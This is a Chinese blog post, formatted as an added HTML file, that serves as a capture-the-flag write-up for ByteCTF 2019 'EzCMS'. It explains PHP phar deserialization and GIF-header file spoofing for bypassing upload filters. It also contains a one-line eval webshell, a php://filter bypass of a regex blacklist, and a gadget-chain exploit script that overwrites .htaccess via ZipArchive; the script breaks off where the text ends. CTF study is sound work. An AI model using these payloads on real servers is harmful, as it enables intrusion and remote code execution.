@@ -1,0 +1,785 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言phar的东西一直没有系统的整理一下,这次碰到这题又卡死在第二层emmmmmm phar简介 phar是什么?phar归档最好的特点是可以方便地将多个文件组合成一个文件。因此，phar归档提供了一种方法，可以将完整的PHP应用程序分发到单个文件中，并从该文件运行它，而不需要将其提取到磁盘。此外，PHP可以像执行任何其他文件一样轻松地执行phar归档，无论是在命令行上还是在web服务器上。  简">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php之phar-bytectf2019-EzCMS">
+<meta property="og:url" content="http://yoursite.com/2019/09/26/PHP之phar-bytectf/index.html">
+<meta property="og:site_name" content="R1dd1er&#39;s blogs">
+<meta property="og:description" content="前言phar的东西一直没有系统的整理一下,这次碰到这题又卡死在第二层emmmmmm phar简介 phar是什么?phar归档最好的特点是可以方便地将多个文件组合成一个文件。因此，phar归档提供了一种方法，可以将完整的PHP应用程序分发到单个文件中，并从该文件运行它，而不需要将其提取到磁盘。此外，PHP可以像执行任何其他文件一样轻松地执行phar归档，无论是在命令行上还是在web服务器上。  简">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/00643K3ogy1g6zhv7pe02j30ha06swf3.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/00643K3ogy1g6zi7toluij30nu07gdg4.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/00643K3ogy1g708ey0ba0j30op094mxm.jpg">
+<meta property="og:updated_time" content="2019-09-23T12:35:53.485Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="php之phar-bytectf2019-EzCMS">
+<meta name="twitter:description" content="前言phar的东西一直没有系统的整理一下,这次碰到这题又卡死在第二层emmmmmm phar简介 phar是什么?phar归档最好的特点是可以方便地将多个文件组合成一个文件。因此，phar归档提供了一种方法，可以将完整的PHP应用程序分发到单个文件中，并从该文件运行它，而不需要将其提取到磁盘。此外，PHP可以像执行任何其他文件一样轻松地执行phar归档，无论是在命令行上还是在web服务器上。  简">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/00643K3ogy1g6zhv7pe02j30ha06swf3.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'R1dd1er'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/09/26/PHP之phar-bytectf/">
+
+
+
+
+
+  <title>php之phar-bytectf2019-EzCMS | R1dd1er's blogs</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">R1dd1er's blogs</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">积跬步，至千里</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/26/PHP之phar-bytectf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="R1dd1er">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R1dd1er's blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">php之phar-bytectf2019-EzCMS</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-26T16:24:56+08:00">
+                2019-09-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>phar的东西一直没有系统的整理一下,这次碰到这题又卡死在第二层emmmmmm</p>
+<h2 id="phar简介"><a href="#phar简介" class="headerlink" title="phar简介"></a>phar简介</h2><blockquote>
+<p>phar是什么?phar归档最好的特点是可以方便地将多个文件组合成一个文件。因此，phar归档提供了一种方法，可以将完整的PHP应用程序分发到单个文件中，并从该文件运行它，而不需要将其提取到磁盘。此外，PHP可以像执行任何其他文件一样轻松地执行phar归档，无论是在命令行上还是在web服务器上。</p>
+</blockquote>
+<p>简单来说,比如Jar文件(Jar是Java ARchive的缩写)。一个应用，包括所有的可执行、可访问的文件，都打包进了一个JAR文件里，使得部署过程十分简单。而PHAR (“Php ARchive”) 就是PHP里类似于JAR的一种打包文件。</p>
+<p>我们先来看一段生成phar文件的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = new Phar(&quot;test.phar&quot;); //后缀名必须为phar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">    $o = new TestObject();</span><br><span class="line">    $o -&gt; data=&apos;R1dd1er&apos;;</span><br><span class="line">    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">    //签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后查看一下生成的test.phar文件<br><img src="http://ww1.sinaimg.cn/large/00643K3ogy1g6zhv7pe02j30ha06swf3.jpg" alt><br>可以看到里面确实有一段反序列化的字符串</p>
+<p>phar是由四个部分组成的</p>
+<p><strong>a stub</strong></p>
+<p>可以理解为一个标志，格式为xxx&lt;?php xxx; <strong>HALT_COMPILER();?&gt;，前面内容不限，但必须以</strong>HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件</p>
+<p><strong>a manifest describing the contents</strong></p>
+<p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
+<p><strong>the file contents</strong></p>
+<p>被压缩文件的内容。</p>
+<p><strong>[optional] a signature for verifying Phar integrity (phar file format only)</strong></p>
+<p>签名，放在文件末尾</p>
+<h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，经过知道创宇安全研究员的测试后发现受影响的函数如下<br><img src="http://ww1.sinaimg.cn/large/00643K3ogy1g6zi7toluij30nu07gdg4.jpg" alt></p>
+<p>通过SUCTF出题人的出题笔记也能发现其他的一些可利用的函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">finfo_file</span><br><span class="line">finfo_buffer</span><br><span class="line">mime_content_type</span><br></pre></td></tr></table></figure></p>
+<p>上述三个函数均通过<code>_php_finfo_get_type</code>间接调用了关键函数<code>php_stream_open_wrapper_ex</code>，导致均可以使用<code>phar://</code>触发phar反序列化</p>
+<p>使用之前生成的test.phar文件进行一个测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    class TestObject &#123;</span><br><span class="line">        public function __destruct() &#123;</span><br><span class="line">            echo &apos;successssss!!!!&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = &apos;phar://test.phar/test.txt&apos;;</span><br><span class="line">    file_get_contents($filename); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这样是可以触发相应的魔术方法的,也就是说成功的反序列化了.因此配合一些系统函数,可以在不调用unserialize()的情况下进行反序列化操作</p>
+<p>而实现这样的攻击,需要具备以下的条件</p>
+<ul>
+<li>phar文件要能够上传到服务器端。</li>
+<li>要有可用的魔术方法作为“跳板”。</li>
+<li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li>
+</ul>
+<p>这里再备忘一下常用的魔术方法</p>
+<ul>
+<li>__wakeup():unserialize()时自动调用</li>
+<li>__destruct():在对象被销毁（unset或PHP执行结束）时自动执行</li>
+<li>__construct():在使用 new关键字使用类实例化一个对象时自动执行,但是在unserialize()时不会自动调用</li>
+<li><strong>call():在对象中调用一个不可访问(不存在)方法时，</strong>call() 会被调用</li>
+<li><strong>get():读取不可访问属性的值时，</strong>get() 会被调用。 </li>
+<li><strong>set() :在给不可访问属性赋值时，</strong>set() 会被调用。</li>
+<li>__toString():在对象被当成字符串使用时自动执行,echo出反序列化类时触发</li>
+<li><strong>sleep():执行serialize()时，先会调用</strong>sleep()</li>
+<li>__invoke():在对象被当成函数使用时自动执行</li>
+<li>__clone():在克隆（clone）对象时自动执行</li>
+</ul>
+<h2 id="phar文件格式伪造及上传绕过"><a href="#phar文件格式伪造及上传绕过" class="headerlink" title="phar文件格式伪造及上传绕过"></a>phar文件格式伪造及上传绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(&quot;test2.phar&quot;);</span><br><span class="line">    $phar = new Phar(&quot;test2.phar&quot;);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头</span><br><span class="line">    $o = new TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">    //签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>我们来看一下生成的phar文件的类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file test2.phar</span><br><span class="line">test2.phar: GIF image data, version 89a, 16188 x 26736</span><br></pre></td></tr></table></figure></p>
+<p>的确是成功的变成了一个gif文件,这样就可以绕过一些文件上传的限制</p>
+<p>同时,phar伪协议还可以配合文件包含进行getshell</p>
+<p>include_test.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include(&apos;phar://./ma.jpg/ma.php&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>ma.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>将ma.php压缩后,后缀改成jpg,访问include_test.php,可以包含到一句话木马</p>
+<h2 id="phar其他利用"><a href="#phar其他利用" class="headerlink" title="phar其他利用"></a>phar其他利用</h2><p>参考sxgg的文章<a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/38</a>,从底层来看phar相关利用的实现,可以发现其他更多的利用方式</p>
+<p>根据文章的内容,Stream API是PHP中一种统一的处理文件的方法，并且其被设计为可扩展的，允许任意扩展作者使用。而phar这个扩展，其就注册了phar://这个stream wrapper(流包装器)。可以使用stream_get_wrapper看到系统内注册了哪一些wrapper<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(stream_get_wrappers());</span><br><span class="line">php shell code:1:</span><br><span class="line">array(11) &#123;</span><br><span class="line">  [0] =&gt;</span><br><span class="line">  string(3) &quot;php&quot;</span><br><span class="line">  [1] =&gt;</span><br><span class="line">  string(4) &quot;file&quot;</span><br><span class="line">  [2] =&gt;</span><br><span class="line">  string(4) &quot;glob&quot;</span><br><span class="line">  [3] =&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [4] =&gt;</span><br><span class="line">  string(4) &quot;http&quot;</span><br><span class="line">  [5] =&gt;</span><br><span class="line">  string(3) &quot;ftp&quot;</span><br><span class="line">  [6] =&gt;</span><br><span class="line">  string(3) &quot;zip&quot;</span><br><span class="line">  [7] =&gt;</span><br><span class="line">  string(13) &quot;compress.zlib&quot;</span><br><span class="line">  [8] =&gt;</span><br><span class="line">  string(5) &quot;https&quot;</span><br><span class="line">  [9] =&gt;</span><br><span class="line">  string(4) &quot;ftps&quot;</span><br><span class="line">  [10] =&gt;</span><br><span class="line">  string(4) &quot;phar&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这边也顺便备忘一下常用伪协议的用法<br><img src="http://ww1.sinaimg.cn/large/00643K3ogy1g708ey0ba0j30op094mxm.jpg" alt></p>
+<p>除了phar协议,使用普通的<code>php://</code>也能触发相应的反序列化操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	class R1dd1er&#123;</span><br><span class="line">		public $a = &apos;&apos;;</span><br><span class="line">		public function __wakeup()&#123;</span><br><span class="line">			echo &quot;yesssssss&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	mime_content_type(&quot;php://filter/read=convert.base64-encode/resource=phar://./test3.phar&quot;);</span><br><span class="line">	//include $_GET[&apos;b&apos;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>测试结果是可以弹出yesssssss的,也就是成功的反序列化</p>
+<p>当然如果来个get请求变量,也是可以通过<code>?b=php://filter/read=convert.base64-encode/resource=phar://./test3.phar</code>来实现反序列化的</p>
+<h2 id="bytectf2019-EzCMS"><a href="#bytectf2019-EzCMS" class="headerlink" title="bytectf2019-EzCMS"></a>bytectf2019-EzCMS</h2><p>第一层是一个哈希拓展攻击,比较简单,没什么特别的,就跳过了,主要是关注一下第二步如何通过phar反序列化干掉死亡<code>.htaccess</code></p>
+<p>本题上传的文件都会在一个无效化的.htaccess文件下层,导致不解析.</p>
+<p>view.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include (&quot;config.php&quot;);</span><br><span class="line">$file_name = $_GET[&apos;filename&apos;];</span><br><span class="line">$file_path = $_GET[&apos;filepath&apos;];</span><br><span class="line">$file_name=urldecode($file_name);</span><br><span class="line">$file_path=urldecode($file_path);</span><br><span class="line">$file = new File($file_name, $file_path);</span><br><span class="line">$res = $file-&gt;view_detail();</span><br><span class="line">$mine = $res[&apos;mine&apos;];</span><br><span class="line">$store_path = $res[&apos;store_path&apos;];</span><br></pre></td></tr></table></figure></p>
+<p>file_name和file_path都可控,并且实例化了一个File类</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">class File&#123;</span><br><span class="line"></span><br><span class="line">    public $filename;</span><br><span class="line">    public $filepath;</span><br><span class="line">    public $checker;</span><br><span class="line"></span><br><span class="line">    function __construct($filename, $filepath)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;filepath = $filepath;</span><br><span class="line">        $this-&gt;filename = $filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function view_detail()&#123;</span><br><span class="line"></span><br><span class="line">        if (preg_match(&apos;/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i&apos;, $this-&gt;filepath))&#123;</span><br><span class="line">            die(&quot;nonono~&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $mine = mime_content_type($this-&gt;filepath);</span><br><span class="line">        $store_path = $this-&gt;open($this-&gt;filename, $this-&gt;filepath);</span><br><span class="line">        $res[&apos;mine&apos;] = $mine;</span><br><span class="line">        $res[&apos;store_path&apos;] = $store_path;</span><br><span class="line">        return $res;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function open($filename, $filepath)&#123;</span><br><span class="line">        $res = &quot;$filename is in $filepath&quot;;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if (isset($this-&gt;checker))&#123;</span><br><span class="line">            $this-&gt;checker-&gt;upload_file();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>关注到了<code>mime_content_type</code>函数,嗯,是个可以触发phar反序列化的函数,并且其参数是我们可控的.</p>
+<p>思路应该是想办法修改或者干掉这个.htaccess或者将文件上传到别的目录下.想将文件传到其他目录,就得反序列化调用upload_file函数,但是其中move_uploaded_file的参数file_tmp(存储在服务器的文件的临时副本的名称),我们并不能知道它的值,也就无法控制这个文件移动函数,看来这个方法行不通</p>
+<p>只能想办法处理.htaccess</p>
+<p>我们还能注意到正则前面有个<code>^</code>,所以只匹配字符串的开始,那么便可以利用<br><code>php://filter/resource=phar://</code>来进行绕过,这个点先留着.</p>
+<p>审计代码,发现File类的代码下有个<code>__destruct</code>,里面的内容是<code>checker-&gt;upload_file()</code>,这个变量调用的方法并不是这个类的方法,再看到其他类的代码里有<code>__call</code>方法,嗯,看来是要从这个方向入手</p>
+<p>我们关注到Profile里面的<code>__call</code>方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;admin-&gt;open($this-&gt;username, $this-&gt;password);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>其中的admin是可控的,如果能将admin改成某种内置类,并且这个内置类有open这个方法,就可以覆盖当下的open,使用下面的脚本来寻找含有open方法的内置类<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$classes = get_declared_classes();</span><br><span class="line">foreach ($classes as $class) &#123;</span><br><span class="line">    $methods = get_class_methods($class);</span><br><span class="line">    foreach ($methods as $method) &#123;</span><br><span class="line">        if (in_array($method, array(</span><br><span class="line">            &apos;open&apos;</span><br><span class="line">        ))) &#123;</span><br><span class="line">            print $class . &apos;::&apos; . $method . &quot;\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SessionHandler::open</span><br><span class="line">ZipArchive::open</span><br><span class="line">XMLReader::open</span><br></pre></td></tr></table></figure>
+<p>从ZipArchive入手,如果在本机做实验的话记得安装一下zip模块</p>
+<p><code>ZipArchive::open ( string $filename [, int $flags ] ) : mixed</code>打开一个新的zip存档以进行读取，写入或修改。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ZIPARCHIVE::OVERWRITE (integer)</span><br><span class="line">总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖。</span><br><span class="line"></span><br><span class="line">ZIPARCHIVE::CREATE (integer)</span><br><span class="line">如果不存在则创建一个zip压缩包。</span><br></pre></td></tr></table></figure>
+<p>为了能调用到Profile的<code>__call</code>方法,我们将File类的checker赋值为一个Profile对象,这样由于调用了不存在的方法,就会去调用<code>__call</code>,同时,参考<code>ZipArchive::open</code>的用法,刚好我们能控制这个open的两个参数,这样就可以构造出一个覆盖.htaccess效果的open方法.</p>
+<p>最终生成phar的脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class File&#123;</span><br><span class="line"></span><br><span class="line">    public $filename;</span><br><span class="line">    public $filepath;</span><br><span class="line">    public $checker;</span><br><span class="line"></span><br><span class="line">    function __construct($filename, $filepath)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;filepath = $filepath;</span><br><span class="line">        $this-&gt;filename = $filename;</span><br><span class="line">        $this-&gt;checker = new Profile();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Profile&#123;</span><br><span class="line"></span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $admin;</span><br><span class="line"></span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;username =  &quot;/var/www/html/sandbox/bad194011f5ad0cf609c77ad222e50d6/.htaccess&quot;;</span><br><span class="line">        $this-&gt;password = ZipArchive::OVERWRITE | ZipArchive::CREATE;</span><br><span class="line">        $this-&gt;admin = new ZipArchive();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new File(&apos;rrr&apos;,&apos;rrr&apos;);</span><br><span class="line">@unlink(&quot;2.phar&quot;);</span><br><span class="line">$phar = new Phar(&quot;2.phar&quot;); //后缀名必须为phar</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">$phar-&gt;setMetadata($a); 